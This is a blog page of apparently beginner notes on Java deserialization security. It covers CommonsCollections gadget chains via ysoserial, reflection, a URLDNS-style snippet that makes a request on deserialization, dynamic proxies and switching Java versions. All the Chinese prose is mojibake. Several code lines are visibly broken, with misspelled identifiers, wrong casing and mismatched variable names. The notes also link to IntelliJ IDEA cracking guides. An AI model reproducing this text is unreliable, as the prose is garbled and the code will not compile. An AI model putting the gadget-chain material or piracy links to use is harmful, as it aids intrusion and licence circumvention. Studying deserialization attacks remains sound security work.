<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>JAVAå®‰å…¨å…¥é—¨åˆ†äº« | DDL'S BLOG</title><meta name="author" content="DDL"><meta name="copyright" content="DDL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="æ–‡ç« æ‰€æœ‰å‚è€ƒå°†åœ¨æ–‡ç« ç»“å°¾ç»™å‡ºï¼Œæˆ‘åªæ˜¯æ ¹æ®æˆ‘çš„ç†è§£ä¸ç¢°åˆ°çš„å›°éš¾ä¾æ¬¡ç»™å‡ºåˆ†äº« ccé“¾å…¨åCommonsCollections å–è‡ª 1https:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial&#x2F;blob&#x2F;master&#x2F;src&#x2F;main&#x2F;java&#x2F;ysoserial&#x2F;payloads&#x2F;  vscodeçªç„¶ä¸ç¼–javaä»£ç äº†ï¼Œä¿®ç†äº†ä¸€ä¸‹1https:&#x2F;&#x2F;cloud.tencent.com&#x2F;d">
<meta property="og:type" content="article">
<meta property="og:title" content="JAVAå®‰å…¨å…¥é—¨åˆ†äº«">
<meta property="og:url" content="http://example.com/2025/03/17/JAVA%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%88%86%E4%BA%AB/index.html">
<meta property="og:site_name" content="DDL&#39;S BLOG">
<meta property="og:description" content="æ–‡ç« æ‰€æœ‰å‚è€ƒå°†åœ¨æ–‡ç« ç»“å°¾ç»™å‡ºï¼Œæˆ‘åªæ˜¯æ ¹æ®æˆ‘çš„ç†è§£ä¸ç¢°åˆ°çš„å›°éš¾ä¾æ¬¡ç»™å‡ºåˆ†äº« ccé“¾å…¨åCommonsCollections å–è‡ª 1https:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial&#x2F;blob&#x2F;master&#x2F;src&#x2F;main&#x2F;java&#x2F;ysoserial&#x2F;payloads&#x2F;  vscodeçªç„¶ä¸ç¼–javaä»£ç äº†ï¼Œä¿®ç†äº†ä¸€ä¸‹1https:&#x2F;&#x2F;cloud.tencent.com&#x2F;d">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/img/avatar.png">
<meta property="article:published_time" content="2025-03-17T11:17:14.000Z">
<meta property="article:modified_time" content="2025-03-17T11:19:27.677Z">
<meta property="article:author" content="DDL">
<meta property="article:tag" content="5wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="http://example.com/2025/03/17/JAVA%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%88%86%E4%BA%AB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'JAVAå®‰å…¨å…¥é—¨åˆ†äº«',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  isShuoshuo: false
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">DDL'S BLOG</span></a><a class="nav-page-title" href="/"><span class="site-name">JAVAå®‰å…¨å…¥é—¨åˆ†äº«</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">JAVAå®‰å…¨å…¥é—¨åˆ†äº«</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-03-17T11:17:14.000Z" title="Created 2025-03-17 19:17:14">2025-03-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-03-17T11:19:27.677Z" title="Updated 2025-03-17 19:19:27">2025-03-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/java/">java</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">18.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>96mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>æ–‡ç« æ‰€æœ‰å‚è€ƒå°†åœ¨æ–‡ç« ç»“å°¾ç»™å‡ºï¼Œæˆ‘åªæ˜¯æ ¹æ®æˆ‘çš„ç†è§£ä¸ç¢°åˆ°çš„å›°éš¾ä¾æ¬¡ç»™å‡ºåˆ†äº«</p>
<p>ccé“¾å…¨åCommonsCollections</p>
<p>å–è‡ª</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/</span><br></pre></td></tr></table></figure>

<h1 id="vscodeçªç„¶ä¸ç¼–javaä»£ç äº†ï¼Œä¿®ç†äº†ä¸€ä¸‹"><a href="#vscodeçªç„¶ä¸ç¼–javaä»£ç äº†ï¼Œä¿®ç†äº†ä¸€ä¸‹" class="headerlink" title="vscodeçªç„¶ä¸ç¼–javaä»£ç äº†ï¼Œä¿®ç†äº†ä¸€ä¸‹"></a>vscodeçªç„¶ä¸ç¼–javaä»£ç äº†ï¼Œä¿®ç†äº†ä¸€ä¸‹</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cloud.tencent.com/developer/article/2171197</span><br></pre></td></tr></table></figure>

<h1 id="ç‰ˆæœ¬"><a href="#ç‰ˆæœ¬" class="headerlink" title="ç‰ˆæœ¬"></a>ç‰ˆæœ¬</h1><ul>
<li>D:\JAVA\java2\bin\java.exe<ul>
<li>21.0.1</li>
</ul>
</li>
<li>D:\JAVA\Java\jdk1.8.0_161\bin\java.exe<ul>
<li>8.0.161</li>
</ul>
</li>
</ul>
<h1 id="ideaç ´è§£"><a href="#ideaç ´è§£" class="headerlink" title="ideaç ´è§£"></a>ideaç ´è§£</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.quanxiaoha.com/idea/uninstall-idea.html</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.quanxiaoha.com/idea-pojie/idea-pojie-20243.html</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯æˆ‘ç¬”è®°ç¯å¢ƒè®¾ç½®ï¼Œé™¤äº†æˆ‘æ²¡äººç”¨çš„ä¸ŠğŸ‘‡ï¼Œæ‰€ä»¥ä¸ç”¨çœ‹</p>
<ul>
<li>javaç¯å¢ƒè®¾ç½®<ul>
<li>jar17<ul>
<li><p>JAVA_HOME</p>
<ul>
<li>D:\JAVA\æ–°å»ºæ–‡ä»¶å¤¹</li>
</ul>
</li>
<li><p>%Java_Home%\jre\bin</p>
</li>
</ul>
</li>
<li>jar 8<ul>
<li>JAVA_HOME<ul>
<li>D:\JAVA\java8</li>
</ul>
</li>
</ul>
</li>
<li>%Java_Home%\jre\binå»æ‰<ul>
<li>D:\JAVA\java8\bin</li>
</ul>
</li>
<li>jar 8u65</li>
</ul>
</li>
</ul>
<h1 id="æŸ¥è¯¢"><a href="#æŸ¥è¯¢" class="headerlink" title="æŸ¥è¯¢"></a>æŸ¥è¯¢</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">where java</span><br><span class="line"></span><br><span class="line">java -XshowSettings:properties -version</span><br></pre></td></tr></table></figure>

<h1 id="å…¨éƒ¨é“¾å­æµç¨‹å›¾"><a href="#å…¨éƒ¨é“¾å­æµç¨‹å›¾" class="headerlink" title="å…¨éƒ¨é“¾å­æµç¨‹å›¾"></a>å…¨éƒ¨é“¾å­æµç¨‹å›¾</h1><p>å›¾æ˜¯å·çš„ï¼Œçœ‹æŒºå¥½çš„</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/370134.html">æ¨¡ç³Šæ€»ç»“</a></p>
<ul>
<li>165å‰åŠæ®µæ˜¯å±é™©å‡½æ•°mapè°ƒç”¨transformæˆ–è€…4æ˜¯compareå‡½æ•°</li>
<li>æœ€åçš„åˆ©ç”¨execæˆ–è€…newinstance</li>
</ul>
<img src="https://github.com/DDL08/images/blob/img/img/AllCC.png?raw=true" alt="AllCC"  />

<h1 id="å¯¼åŒ…"><a href="#å¯¼åŒ…" class="headerlink" title="å¯¼åŒ…"></a>å¯¼åŒ…</h1><ul>
<li><a target="_blank" rel="noopener" href="http://hessian.caucho.com/">http://hessian.caucho.com/</a></li>
<li><a target="_blank" rel="noopener" href="https://central.sonatype.com/?smo=true">mavené¡¹ç›®å¿«é€Ÿå¯¼åŒ…</a></li>
<li><a target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/com.sun.syndication">https://mvnrepository.com/artifact/com.sun.syndication</a></li>
</ul>
<h2 id="maven3-2-1"><a href="#maven3-2-1" class="headerlink" title="maven3.2.1"></a>maven3.2.1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections.functors.*;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">//F:/ctf-tool/ctf/t/lz/cc/c1/cc1/target/classes/org/example/call.class</span><br></pre></td></tr></table></figure>

<h2 id="maven4"><a href="#maven4" class="headerlink" title="maven4"></a>maven4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections4.Transformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line">//F:/ctf-tool/ctf/t/lz/cc/c1/cc1/target/classes/org/example/call.class</span><br></pre></td></tr></table></figure>



<h1 id="javaå®‰å…¨"><a href="#javaå®‰å…¨" class="headerlink" title="javaå®‰å…¨"></a>javaå®‰å…¨</h1><p>(templateslmplåˆ©ç”¨é“¾)[<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_62046696/article/details/129487886]">https://blog.csdn.net/qq_62046696/article/details/129487886]</a></p>
<h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><ul>
<li>é™æ€æˆå‘˜å˜é‡ä¸èƒ½è¢«ååºåˆ—åŒ–</li>
<li>transientæ ‡è¯†çš„å¯¹è±¡ä¸å‚ä¸ååºåˆ—åŒ–</li>
<li>å‡½æ•°<ul>
<li>writeobject</li>
<li>readobject</li>
</ul>
</li>
</ul>
<p>hashmap</p>
<h2 id="ååºåˆ—åŒ–é¢˜ç›®"><a href="#ååºåˆ—åŒ–é¢˜ç›®" class="headerlink" title="ååºåˆ—åŒ–é¢˜ç›®"></a>ååºåˆ—åŒ–é¢˜ç›®</h2><ol>
<li>ctfshowå·ç‹æ¯tomcat</li>
<li></li>
</ol>
<h2 id="åå°„"><a href="#åå°„" class="headerlink" title="åå°„"></a>åå°„</h2><p>æ¦‚å¿µï¼šè¿è¡Œæ—¶åŠ¨æ€åˆ›å»ºå¯¹è±¡</p>
<p>ä½œç”¨ï¼šè®©javaå…·æœ‰åŠ¨æ€æ€§</p>
<h3 id="1å®ä¾‹åŒ–å¯¹è±¡"><a href="#1å®ä¾‹åŒ–å¯¹è±¡" class="headerlink" title="1å®ä¾‹åŒ–å¯¹è±¡"></a>1å®ä¾‹åŒ–å¯¹è±¡</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Class c =person.getClass();</span><br><span class="line"></span><br><span class="line">//ä»åŸå‹é‡Œå®ä¾‹åŒ–å¯¹è±¡</span><br><span class="line">#c.newInstance() #æ— å‚</span><br><span class="line">#æœ‰å‚ğŸ‘‡</span><br><span class="line">Constructor personconstructor=c.getConstructor(String.class.init.class);</span><br><span class="line">Person p=(Person)personconstrructor.newInstance(&quot;abc&quot;,22);</span><br><span class="line">#èµ‹å€¼ğŸ‘†</span><br><span class="line">System.out.println(p);</span><br></pre></td></tr></table></figure>

<h3 id="2è·å–ç±»é‡Œé¢çš„å±æ€§"><a href="#2è·å–ç±»é‡Œé¢çš„å±æ€§" class="headerlink" title="2è·å–ç±»é‡Œé¢çš„å±æ€§"></a>2è·å–ç±»é‡Œé¢çš„å±æ€§</h3><ul>
<li>getFields<ul>
<li>è·å–å…±æœ‰çš„å±æ€§</li>
</ul>
</li>
<li>getDeclaredFields<ul>
<li>è·å–å…¨éƒ¨å±æ€§</li>
</ul>
</li>
<li>å¦‚æœéœ€è¦æŸ¥çœ‹å†™ä¸ª<ul>
<li>Field[] personfields&#x3D;c.getDeclaredFields();</li>
<li>for(Field f:personfields){System.out.println(f);}</li>
</ul>
</li>
</ul>
<h3 id="3ä¿®æ”¹ç±»é‡Œé¢çš„å±æ€§"><a href="#3ä¿®æ”¹ç±»é‡Œé¢çš„å±æ€§" class="headerlink" title="3ä¿®æ”¹ç±»é‡Œé¢çš„å±æ€§"></a>3ä¿®æ”¹ç±»é‡Œé¢çš„å±æ€§</h3><p>æ”¹ä¸ªåå­—</p>
<ul>
<li>Field namefield &#x3D;c.getField(â€œnameâ€)</li>
<li>namefoeld.set(p,â€saffsâ€);</li>
<li>System.out.println(p);</li>
</ul>
<p>è½¬å¹´é¾„</p>
<ul>
<li>Field namefield &#x3D; c.getField(â€œageâ€)</li>
<li>namefield.setAccessible(true);<ul>
<li>è®©å…è®¸è®¿é—®è¿™ä¸ªageè¿™ä¸ªç§æœ‰å±æ€§</li>
</ul>
</li>
<li>namefoeld.set(p,25);</li>
<li>System.out.println(p);</li>
</ul>
<h3 id="4è°ƒç”¨ç±»é‡Œé¢çš„æ–¹æ³•"><a href="#4è°ƒç”¨ç±»é‡Œé¢çš„æ–¹æ³•" class="headerlink" title="4è°ƒç”¨ç±»é‡Œé¢çš„æ–¹æ³•"></a>4è°ƒç”¨ç±»é‡Œé¢çš„æ–¹æ³•</h3><ul>
<li>Method actionmethod &#x3D;c.getMethod(â€œactionâ€,String.class);</li>
<li>actionmethod.invoke(p,â€adaadâ€)</li>
</ul>
<p>éå†æ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Method[] personmethods=c.getMethods();</span><br><span class="line">for(Method m:personmethods)&#123;</span><br><span class="line">System.out.println(m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5hashmapå¸¦url"><a href="#5hashmapå¸¦url" class="headerlink" title="5hashmapå¸¦url"></a>5hashmapå¸¦url</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hahscodefield.set(url,1234);HashMap&lt;URL Integer&gt; hashmap =new HashMap&lt;~&gt;();</span><br><span class="line">//å¦‚æœurlå¯¹è±¡çš„hashcodeä¸æ˜¯-1å°†ä¼šå‘èµ·è¯·æ±‚</span><br><span class="line">Url ul=new URL(&quot;http://xxxx&quot;);</span><br><span class="line">Class c=url.getClass();</span><br><span class="line">Field hashcodefield=c.getDeclareField(&quot;hashCode&quot;);</span><br><span class="line">hashcodefield.setAcessible(True);</span><br><span class="line">hahscodefield.set(url,1234);</span><br><span class="line">hashmap.put(url,1);</span><br><span class="line">//hahscodeæ”¹ä¸º-1</span><br><span class="line">//é€šè¿‡åå°„,æ”¹å˜å·²æœ‰çš„å¯¹è±¡çš„å±æ€§</span><br><span class="line">hahscodefield.set(url,-1);</span><br></pre></td></tr></table></figure>

<p>åºåˆ—åŒ–æ²¡è¯·æ±‚ï¼Œååºåˆ—åŒ–æœ‰è¯·æ±‚â†‘</p>
<h2 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h2><h3 id="1é€šè¿‡å…¶ä»–å¯¹è±¡è®¿é—®æºå¯¹è±¡"><a href="#1é€šè¿‡å…¶ä»–å¯¹è±¡è®¿é—®æºå¯¹è±¡" class="headerlink" title="1é€šè¿‡å…¶ä»–å¯¹è±¡è®¿é—®æºå¯¹è±¡"></a>1é€šè¿‡å…¶ä»–å¯¹è±¡è®¿é—®æºå¯¹è±¡</h3><h4 id="é™æ€ä»£ç†"><a href="#é™æ€ä»£ç†" class="headerlink" title="é™æ€ä»£ç†"></a>é™æ€ä»£ç†</h4><p>æ¥å£å˜ï¼Œé™æ€ä»£ç†ä¹Ÿå¾—è·Ÿç€å˜ï¼Œé‡å¤å·¥ä½œ</p>
<ul>
<li><p>IUser user&#x3D;new UserImpl();</p>
</li>
<li><p>IUser userProxy &#x3D;new UserProxy(user);</p>
</li>
<li><p>userProxy.sjow();</p>
</li>
</ul>
<h4 id="åŠ¨æ€ä»£ç†-1"><a href="#åŠ¨æ€ä»£ç†-1" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h4><p>newProxyInstance(ç±»åŠ è½½å™¨+æ¥å£+å¤„ç†å™¨ï¼ˆè¦åšçš„äº‹æƒ…))</p>
<ul>
<li><p>proxy.newProxyInstance(user.getClass.getClassLoader(),user.getClass().getInterfaces(),);</p>
</li>
<li><p>è‡ªå·±å†™ä¸ªhandlerå»é‡å†™æ–¹æ³•invoke</p>
</li>
<li><pre><code>- InvocationHandler userinvocationhandle=new UserInvocationHandler(user);
- IUser userproxy=(IUser) proxy.newProxyInstance(user.getClass(.getClassLoader(),user.getClass().getInterfaces(),));
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## åŠ¨æ€åŠ è½½</span><br><span class="line"></span><br><span class="line">class.forName(&quot;Person&quot;);</span><br><span class="line"></span><br><span class="line">ClassLoader cl =ClassLoader.getSystemClassLoader();</span><br><span class="line"></span><br><span class="line">ClassLoader.loadClassä¸è¿›è¡Œåˆå§‹åŒ–</span><br><span class="line"></span><br><span class="line"># é—®é¢˜</span><br><span class="line"></span><br><span class="line">## javaç‰ˆæœ¬çš„åˆ‡æ¢</span><br><span class="line"></span><br></pre></td></tr></table></figure>
sudo apt update
sudo apt install openjdk-8-jdk
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">æ˜¾ç¤ºå½“å‰æœ‰çš„ç‰ˆæœ¬</span><br><span class="line"></span><br></pre></td></tr></table></figure>
sudo update-alternatives --config java
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">å†è¾“å…¥æ•°å­—å¯ä»¥åˆ‡æ¢</span><br><span class="line"></span><br><span class="line">### å‚è€ƒ</span><br><span class="line"></span><br></pre></td></tr></table></figure>
https://blog.csdn.net/huayimy/article/details/130273362
